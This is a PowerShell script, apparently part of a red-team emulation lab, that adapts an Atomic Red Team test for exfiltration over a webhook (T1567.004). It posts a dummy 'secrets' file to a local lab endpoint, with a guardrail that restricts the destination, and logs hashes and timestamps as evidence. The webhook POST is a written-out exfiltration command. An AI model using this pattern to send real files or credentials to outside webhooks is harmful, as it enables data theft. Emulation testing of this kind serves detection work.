# ATA057 - T1567.004 Exfiltration Over Webhook (Windows)
# ART tal cual: atomic T1567.004 "Exfiltrate staged data to a Discord webhook (PowerShell)"
# guid f0057c81-24dc-4a2e-b658-5809c242180b.
# Unica adaptacion: input_arguments `webhook_url` y `staged_file` apuntan al laboratorio local.
# El cuerpo se envia como bytes UTF-8 para poder demostrar su sha256 (mismo JSON del ART).
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null

$webhook_url = 'http://192.168.65.1:9090/hook/ATA057'
if ($webhook_url -notlike 'http://192.168.65.1:9090/*') {
    'GUARDARRAIL: destino no permitido' | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii
    exit 2
}

$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$staged_file = Join-Path $dir 'T1567.004_loot.txt'

# --- comando ART (f0057c81) ---
"secrets, api keys, passwords - T1567.004 atomic test" | Out-File -FilePath $staged_file -Encoding ascii
$body = @{ content = (Get-Content -Raw $staged_file) } | ConvertTo-Json
$bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
[System.IO.File]::WriteAllBytes((Join-Path $ev 'body.json'), $bytes)
$status = ''
try {
    $r = Invoke-RestMethod -Uri $webhook_url -Method Post -ContentType 'application/json' -Body $bytes
    $status = 'HTTP=200'
} catch {
    $status = 'ERROR=' + $_.Exception.Message
}
# --- fin comando ART ---

$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$shaBody = (Get-FileHash (Join-Path $ev 'body.json') -Algorithm SHA256).Hash.ToLower()
@(
    "ata=ATA057",
    "tecnica=T1567.004",
    "fuente=ART",
    "guid=f0057c81-24dc-4a2e-b658-5809c242180b",
    "t0=$t0",
    "t1=$t1",
    "url=$webhook_url",
    "staged=$staged_file",
    "sha256_body=$shaBody",
    "len_body=$($bytes.Length)",
    "resultado=$status"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
@("t0=$t0", "t1=$t1") | Out-File -FilePath (Join-Path $ev 'times.log') -Encoding ascii
exit 0
